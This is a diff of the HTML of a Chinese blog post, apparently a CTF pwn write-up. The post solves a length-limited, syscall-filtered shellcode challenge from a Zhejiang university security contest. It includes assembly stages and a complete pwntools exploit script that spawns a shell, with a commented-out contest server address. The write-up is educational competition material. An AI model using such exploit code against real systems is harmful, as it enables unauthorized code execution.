@@ -23,27 +23,36 @@
 
     <meta name="description" content="shellcode  shellcode 是一段用于利用软件漏洞而执行的代码，shellcode 为 16 进制之机械码，以其经常让攻击者获得 shell 而得名。shellcode 常常使用机器语言编写。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="shellcode - 有长度限制的shellcode解法">
+<meta property="og:title" content="shellcode - 有长度限制的 shellcode 解法">
 <meta property="og:url" content="http://example.com/2024/11/03/2024113-shellcode---%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84shellcode%E8%A7%A3%E6%B3%95/index.html">
 <meta property="og:site_name" content="蘅芷清芬">
 <meta property="og:description" content="shellcode  shellcode 是一段用于利用软件漏洞而执行的代码，shellcode 为 16 进制之机械码，以其经常让攻击者获得 shell 而得名。shellcode 常常使用机器语言编写。">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024113-shellcode---%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84shellcode%E8%A7%A3%E6%B3%95/image-20241103161301251.png">
+<meta property="og:image" content="http://example.com/2024113-shellcode---%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84shellcode%E8%A7%A3%E6%B3%95/image-20241103161656543.png">
+<meta property="og:image" content="http://example.com/2024113-shellcode---%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84shellcode%E8%A7%A3%E6%B3%95/image-20241103161752048.png">
+<meta property="og:image" content="http://example.com/2024113-shellcode---%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84shellcode%E8%A7%A3%E6%B3%95/image-20241103162203348.png">
+<meta property="og:image" content="http://example.com/2024113-shellcode---%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84shellcode%E8%A7%A3%E6%B3%95/image-20241103165250942.png">
+<meta property="og:image" content="http://example.com/2024113-shellcode---%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84shellcode%E8%A7%A3%E6%B3%95/image-20241103171307808.png">
+<meta property="og:image" content="http://example.com/2024113-shellcode---%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84shellcode%E8%A7%A3%E6%B3%95/image-20241103171530664.png">
+<meta property="og:image" content="http://example.com/2024113-shellcode---%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84shellcode%E8%A7%A3%E6%B3%95/image-20241103174318078.png">
 <meta property="article:published_time" content="2024-11-02T16:00:00.000Z">
-<meta property="article:modified_time" content="2024-11-03T14:12:25.212Z">
+<meta property="article:modified_time" content="2024-11-03T14:12:25.000Z">
 <meta property="article:author" content="summ2">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="shellcode">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024113-shellcode---%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84shellcode%E8%A7%A3%E6%B3%95/image-20241103161301251.png">
 
 
 <link rel="canonical" href="http://example.com/2024/11/03/2024113-shellcode---%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84shellcode%E8%A7%A3%E6%B3%95/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2024/11/03/2024113-shellcode---%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84shellcode%E8%A7%A3%E6%B3%95/","path":"2024/11/03/2024113-shellcode---有长度限制的shellcode解法/","title":"shellcode - 有长度限制的shellcode解法"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2024/11/03/2024113-shellcode---%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%9A%84shellcode%E8%A7%A3%E6%B3%95/","path":"2024/11/03/2024113-shellcode---有长度限制的shellcode解法/","title":"shellcode - 有长度限制的 shellcode 解法"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>shellcode - 有长度限制的shellcode解法 | 蘅芷清芬</title>
+<title>shellcode - 有长度限制的 shellcode 解法 | 蘅芷清芬</title>
   
 
 
@@ -170,12 +179,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="shellcode - 有长度限制的shellcode解法 | 蘅芷清芬">
+      <meta itemprop="name" content="shellcode - 有长度限制的 shellcode 解法 | 蘅芷清芬">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          shellcode - 有长度限制的shellcode解法
+          shellcode - 有长度限制的 shellcode 解法
         </h1>
 
         <div class="post-meta-container">
@@ -216,44 +225,35 @@
 <h1 id="程序分析">程序分析</h1>
 <p>题目来源：<strong>第七届浙江省大学生网络与信息安全竞赛预赛</strong></p>
 <figure>
-<img
-src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103161301251.png"
-alt="image-20241103161301251" />
+<img src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103161301251.png" alt="image-20241103161301251">
 <figcaption aria-hidden="true">image-20241103161301251</figcaption>
 </figure>
 <h2 id="checksec">checksec</h2>
 <figure>
-<img
-src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103161656543.png"
-alt="保护全开" />
+<img src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103161656543.png" alt="保护全开">
 <figcaption aria-hidden="true">保护全开</figcaption>
 </figure>
 <h2 id="逆向分析">逆向分析</h2>
 <figure>
-<img
-src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103161752048.png"
-alt="IDA伪代码" />
-<figcaption aria-hidden="true">IDA伪代码</figcaption>
+<img src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103161752048.png" alt="IDA伪代码">
+<figcaption aria-hidden="true">IDA 伪代码</figcaption>
 </figure>
-<p>程序的功能很直接，执行输入的一段shellcode，但是有
+<p>程序的功能很直接，执行输入的一段 shellcode，但是有
 <strong>0xa</strong> 的长度限制。</p>
 <p>并且存在 <code>memmem</code> 函数，检查输入的内容，使用 IDA 继续查看
 <code>unk_203D</code> 的内容，发现是出题人禁止了 <code>syscall</code>
 的机器码。</p>
 <figure>
-<img
-src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103162203348.png"
-alt="syscall(&#39;0f&#39;)" />
+<img src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103162203348.png" alt="syscall('0f')">
 <figcaption aria-hidden="true">syscall('0f')</figcaption>
 </figure>
 <h2 id="动态调试">动态调试</h2>
-<p><img
-src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103165250942.png" /></p>
+<p><img src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103165250942.png"></p>
 <p>在程序执行 shellcode 之后，观察寄存器和栈的情况。当时比赛时发现
 <code>r8</code> 中存有 <code>syscall</code>
 指令的地址，我的一个想法是控制寄存器 <code>rax</code>, <code>rdi</code>,
 <code>rsi</code>, <code>rdx</code> 执行系统调用 <code>read</code>。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rsi,rax</span><br><span class="line">xor rax,rax</span><br><span class="line">xor rdi,rdi</span><br><span class="line">add rdx,0x50</span><br><span class="line">call r8</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rsi,rax</span><br><span class="line">xor rax,rax</span><br><span class="line">xor rdi,rdi</span><br><span class="line">add rdx,0x50</span><br><span class="line">call r8</span><br></pre></td></tr></tbody></table></figure>
 <p>不过这样的长度已经超出 0xa 的限制了。后面我又想了很久，想继续利用
 <code>r8</code> 跳转到某个 <code>main</code> 函数上的指令，调试发现从
 <code>r8</code> 到一个 <code>main</code>
@@ -264,25 +264,21 @@ src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103165250
 <p><em>这里的思路是白夜学长提供的。</em></p>
 <h2 id="调整传参寄存器控制程序流程">调整传参寄存器，控制程序流程</h2>
 <p>ELF 中的 <code>read</code> 函数参数如下</p>
-<p><img
-src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103171307808.png" /></p>
+<p><img src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103171307808.png"></p>
 <p>栈中的数据如下</p>
 <figure>
-<img
-src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103171530664.png"
-alt="由于程序中使用call rax执行shellcode，返回地址存在栈顶" />
-<figcaption aria-hidden="true">由于程序中使用call
-rax执行shellcode，返回地址存在栈顶</figcaption>
+<img src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103171530664.png" alt="由于程序中使用call rax执行shellcode，返回地址存在栈顶">
+<figcaption aria-hidden="true">由于程序中使用 call
+rax 执行 shellcode，返回地址存在栈顶</figcaption>
 </figure>
 <h3 id="第一段-shellcode">第一段 shellcode</h3>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pop rdx; 返回地址出栈</span><br><span class="line">pop rdi; fd</span><br><span class="line">pop rsi; 将不需要的数据出栈</span><br><span class="line">pop rsi; *buf &lt;- shellcode address</span><br><span class="line">sud rdx,0x41; 减去偏移，结果为 &lt;main+00f1&gt;</span><br><span class="line">call rdx</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pop rdx; 返回地址出栈</span><br><span class="line">pop rdi; fd</span><br><span class="line">pop rsi; 将不需要的数据出栈</span><br><span class="line">pop rsi; *buf &lt;- shellcode address</span><br><span class="line">sud rdx,0x41; 减去偏移，结果为 &lt;main+00f1&gt;</span><br><span class="line">call rdx</span><br></pre></td></tr></tbody></table></figure>
 <p>将程序跳转到 <code>main</code> 函数的 <code>call _read</code> 前:</p>
-<p><img
-src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103174318078.png" /></p>
+<p><img src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103174318078.png"></p>
 <h2 id="执行-shellcode">执行 shellcode</h2>
 <p>没有了读入限制后，直接使用 pwntool 生成的 shellcode 即可。</p>
 <h1 id="exploit">Exploit</h1>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">p = process(<span class="string">&quot;./shellcode1&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;139.155.126.78&quot;, &quot;38681&quot;)</span></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">pop rdx;</span></span><br><span class="line"><span class="string">pop rdi;</span></span><br><span class="line"><span class="string">pop rsi;</span></span><br><span class="line"><span class="string">pop rsi;</span></span><br><span class="line"><span class="string">sub rdx, 0x41;</span></span><br><span class="line"><span class="string">call rdx;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input&quot;</span>, asm(shellcode))</span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> <span class="comment">#10个nop，因为下次执行的地址是在shellcode1的结尾(call rdx)</span></span><br><span class="line">shellcode += shellcraft.sh()</span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">p = process(<span class="string">"./shellcode1"</span>)</span><br><span class="line"><span class="comment">#p = remote("139.155.126.78", "38681")</span></span><br><span class="line">shellcode = <span class="string">"""</span></span><br><span class="line"><span class="string">pop rdx;</span></span><br><span class="line"><span class="string">pop rdi;</span></span><br><span class="line"><span class="string">pop rsi;</span></span><br><span class="line"><span class="string">pop rsi;</span></span><br><span class="line"><span class="string">sub rdx, 0x41;</span></span><br><span class="line"><span class="string">call rdx;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendafter(<span class="string">b"input"</span>, asm(shellcode))</span><br><span class="line">shellcode = <span class="string">"""</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">"""</span> <span class="comment">#10个nop，因为下次执行的地址是在shellcode1的结尾(call rdx)</span></span><br><span class="line">shellcode += shellcraft.sh()</span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>
 <h1 id="小结">小结</h1>
 <p>这回的省赛属于是坐了四小时大牢了。每道题目或者是在现实实践中，自然是与之前遇到的情况会有不同。因此对程序动态运行中的各种状态应该敏锐一些，例如栈、寄存器，可能会有发现。</p>
 
